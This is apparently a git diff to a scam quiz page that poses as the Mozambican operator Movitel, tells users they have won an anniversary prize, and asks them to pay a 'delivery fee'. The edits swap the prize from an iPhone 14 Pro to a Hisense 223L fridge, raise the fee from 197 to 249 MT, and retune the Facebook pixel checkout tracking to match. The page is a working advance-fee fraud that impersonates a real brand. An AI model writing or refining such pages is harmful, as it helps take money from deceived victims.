@@ -535,7 +535,7 @@ function showConclusion() {
       <p style="margin: 0; font-weight: bold;">Pontuação Final: <span style="color: #E53935;">${userPoints}</span> / 105</p>
     </div>
     
-    <img src="img/6mov.png" alt="Parabéns">
+    <img src="imagens/PARABENS.png" alt="Parabéns">
     
     ${userPoints >= 60 ? 
       `<div style="background-color: #e8f5e9; padding: 15px; border-radius: 8px; margin: 15px 0; text-align: center;">
@@ -658,13 +658,13 @@ function showDeliveryDetails() {
     
     <h2>Detalhes da Entrega</h2>
     
-    <img src="img/9mov.png" alt="Entrega">
+    <img src="imagens/PD.png" alt="Entrega">
     
-    <p>🎉 Parabéns! Qualificamos você para ganhar o iPhone 14 Pro exclusivo da Movitel pelo 13º aniversário da nossa operadora!</p>
+    <p>🎉 Parabéns! Qualificamos você para ganhar a Geleira Hisense 223L exclusiva da Movitel pelo 13º aniversário da nossa operadora!</p>
     
     <p>A entrega do prêmio será realizada pelo Portador Diário, nossa empresa parceira.</p>
     
-    <p>De acordo com a sua localização, o pagamento do transporte custará apenas 197 MT.</p>
+    <p>De acordo com a sua localização, o pagamento do transporte custará apenas 249 MT.</p>
     
     <p>Todos os custos com o prêmio ficam por nossa conta. Você paga somente o transporte!</p>
     
@@ -679,16 +679,16 @@ function showDeliveryDetails() {
 
 function showPaymentInstructions() {
   fbq('track', 'InitiateCheckout', {
-    value: 197.00,
+    value: 249.00,
     currency: 'MZN',
-    content_name: 'Taxa de Envio iPhone 14 Pro',
-    content_ids: ['iphone14pro_delivery']
+    content_name: 'Taxa de Envio Gileira Hisense 223L',
+    content_ids: ['hisense223L_delivery']
     });
   // Atualizar pontos no cabeçalho
   updateHeaderPoints();
   
   // Calcular valor do envio baseado na localização (simulação)
-  const taxaEnvio = "197";
+  const taxaEnvio = "249";
   
   quizContainer.innerHTML = `
     <div style="text-align: center; margin-bottom: 20px;">
@@ -699,7 +699,7 @@ function showPaymentInstructions() {
     <!-- Resumo do pedido -->
     <div style="background-color: #f8f9fa; padding: 15px; border-radius: 8px; margin-bottom: 20px; border: 1px solid #e1e4e8;">
       <h3 style="margin-top: 0; font-size: 1.1rem; color: #333;">Resumo do Pedido</h3>
-      
+      6
       <div style="display: flex; margin-bottom: 15px; align-items: center;">
         <div style="width: 80px; height: 80px; background-color: #eee; border-radius: 8px; overflow: hidden; margin-right: 15px;">
           <img src="imagens/20250611_1704_Recibo de Envio_simple_compose_01jxfr9366exysz84jsj1k3ce1.png" alt="Hisensen 223L" style="width: 100%; height: 100%; object-fit: cover;">
